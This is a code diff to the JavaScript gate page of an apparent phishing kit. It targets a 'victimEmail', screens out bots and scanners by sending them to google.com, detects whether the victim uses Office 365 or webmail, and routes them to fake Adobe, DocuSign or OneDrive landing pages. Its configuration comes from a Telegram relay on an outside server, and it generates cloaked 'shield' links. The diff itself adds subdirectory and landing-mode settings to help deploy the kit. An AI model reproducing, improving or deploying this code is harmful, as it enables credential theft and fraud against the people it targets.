@@ -162,21 +162,32 @@
 
 <script>
 /* ══════════════════════════════════════════════════════════════════════════
-   STANDALONE GATE — Single-file, cross-origin, LinkShield-integrated
+   STANDALONE GATE — Single-file, cross-origin configuration
    ══════════════════════════════════════════════════════════════════════════
 
-   CONFIGURATION — update MAIN_APP_URL to your main server before deploying.
-   Everything else is fetched automatically from the main server at runtime.
+   REQUIRED — set MAIN_APP_URL + APP_PATH to match your main server:
+     • MAIN_APP_URL : domain only, no trailing slash
+     • APP_PATH     : subdirectory where the app lives, e.g. "/page"
+                      Leave as "" if the app is at the domain root
+
+   OPTIONAL OVERRIDES (survive even when the server APIs are unreachable):
+     • LANDING_MODE : force dual routing without needing vault config
+                      Values: "" | "dual-adobe-onedrive" | "dual-docusign-onedrive"
    ══════════════════════════════════════════════════════════════════════════ */
 
-const MAIN_APP_URL      = "https://starsprit.com"; // ← Your main server (no trailing slash)
-const BLOCK_REDIRECT_URL = "https://google.com";   // ← Where blocked visitors go
+const MAIN_APP_URL       = "https://starsprit.com"; // ← domain only, no trailing slash
+const APP_PATH           = "/share";                       // ← e.g. "/page" or "/doulble/page"
+const LANDING_MODE       = "dual-adobe-onedrive";                       // ← e.g. "dual-docusign-onedrive"
+const BLOCK_REDIRECT_URL = "https://google.com";     // ← where blocked visitors go
 
 (async function () {
 
   /* ── Helpers ─────────────────────────────────────────────────────────── */
   function el(id) { return document.getElementById(id); }
   async function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+  // Full base URL for all main-server API calls and share page links
+  const apiBaseUrl = MAIN_APP_URL.replace(/\/+$/, '') + APP_PATH;
 
   function safeFetch(url, opts, timeoutMs = 8000) {
     const controller = new AbortController();
@@ -262,16 +273,16 @@ const BLOCK_REDIRECT_URL = "https://google.com";   // ← Where blocked visitors
   const [preCheck, cfg, providerData] = await Promise.all([
 
     // IP / bot pre-check — 2s max, non-critical (best-effort)
-    safeFetch(MAIN_APP_URL + '/verify_visitor_api.php', {
+    safeFetch(apiBaseUrl + '/verify_visitor_api.php', {
       method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({})
     }, 2000),
 
     // Main server config (landing mode, page style, shield fields)
-    safeFetch(MAIN_APP_URL + '/telegram_relay.php?config=1', undefined, 4000),
+    safeFetch(apiBaseUrl + '/telegram_relay.php?config=1', undefined, 4000),
 
     // Email provider detection (O365 vs webmail)
     emailValid
-      ? safeFetch(MAIN_APP_URL + '/detect_provider_api.php?email=' + encodeURIComponent(victimEmail), undefined, 4000)
+      ? safeFetch(apiBaseUrl + '/detect_provider_api.php?email=' + encodeURIComponent(victimEmail), undefined, 4000)
       : Promise.resolve({}),
 
     // Visual scan runs concurrently
@@ -290,7 +301,8 @@ const BLOCK_REDIRECT_URL = "https://google.com";   // ← Where blocked visitors
   }
 
   /* ── Step 4: Resolve target landing page ─────────────────────────────── */
-  const landingMode  = cfg.landing_mode || 'single';
+  // LANDING_MODE constant takes priority; falls back to server config then 'single'
+  const landingMode  = LANDING_MODE || cfg.landing_mode || 'single';
   const installerUrl = cfg.installer_url || '';
   const webmailUrl   = cfg.webmail_installer_url || '';
 
@@ -394,7 +406,7 @@ const BLOCK_REDIRECT_URL = "https://google.com";   // ← Where blocked visitors
   const landingId   = toLandingId(targetPage);
   const tokenApiUrl = cfg.shield_token_api
                         ? makeAbsolute(cfg.shield_token_api)
-                        : MAIN_APP_URL.replace(/\/+$/, '') + '/shield_token_api.php';
+                        : apiBaseUrl + '/shield_token_api.php';
 
   let shieldUrl = '';
 
@@ -419,13 +431,13 @@ const BLOCK_REDIRECT_URL = "https://google.com";   // ← Where blocked visitors
   }
 
   /* ── Step 7: Direct share URL — used when shield is off or token fails ──
-     Uses app_base from config to handle subdirectory deployments correctly. */
+     apiBaseUrl already includes APP_PATH, so this works with or without
+     a working server config fetch.                                         */
   if (!shieldUrl) {
     const refParam = urlParams.get('ref')
       ? '?ref=' + urlParams.get('ref')
       : (victimEmail ? '?ref=' + encodeURIComponent(btoa(victimEmail)) : '');
-    const appBase = MAIN_APP_URL.replace(/\/+$/, '') + (cfg.app_base || '');
-    shieldUrl = appBase + '/share/' + targetPage + refParam;
+    shieldUrl = apiBaseUrl + '/share/' + targetPage + refParam;
   }
 
   await delay(300);
